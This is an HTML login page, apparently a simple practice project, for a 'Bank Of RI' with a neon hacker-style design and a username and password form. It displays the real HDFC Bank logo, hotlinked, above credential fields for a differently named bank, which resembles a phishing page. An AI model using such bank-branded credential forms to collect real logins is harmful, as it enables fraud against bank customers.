<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            font-family: 'Courier New', Courier, monospace;
            background: linear-gradient(to right, #000428, #004e92);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding-top: 20px;
            color: #39FF14;
            overflow: auto;
        }
        .header {
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 10px 20px;
            background: #282828;
            box-shadow: 0 0 10px #39FF14;
            border-bottom: 2px solid #39FF14;
            margin-bottom: 20px;
            width: auto;
        }
        .header h1 {
            font-size: 2.5em;
            color: #39FF14;
            text-shadow: 0 0 5px #39FF14, 0 0 10px #39FF14, 0 0 20px #39FF14;
            margin: 0;
        }
        .form-container {
            background: #282828;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 15px #39FF14;
            width: 90%;
            max-width: 500px;
            margin-bottom: 20px;
        }
        input[type="text"], input[type="password"] {
            width: calc(100% - 20px);
            padding: 10px;
            margin-top: 10px;
            margin-bottom: 20px;
            border-radius: 5px;
            border: 1px solid #39FF14;
            font-size: 16px;
            background: #121212;
            color: #39FF14;
            box-shadow: 0 0 5px #39FF14;
        }
        button {
            padding: 15px 30px;
            font-size: 18px;
            color: #121212;
            background-color: #39FF14;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            box-shadow: 0 5px #666;
            transition: all 0.3s ease;
        }
        button:hover {
            transform: translateY(-5px);
            background-color: #00FF00;
        }
        button:active {
            box-shadow: 0 3px #666;
            transform: translateY(4px);
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>Login To Bank Account</h1>
    </div>
    <center>
        <header id="header">
            <h1>Welcome To Bank Of RI.....</h1>
            <img src="https://netbanking.hdfcbank.com/netbanking/gif/Logo.svg" alt="Bank Logo"><br><br>
        </header>
        <div class="form-container">
            <form action="login" method="post">
                UserName: <input type="text" name="user_name" required><br><br>
                Password: <input type="password" name="password" required><br><br>
                <button type="submit" value="login">Login</button>
            </form>
        </div>
    </center>
</body>
</html>
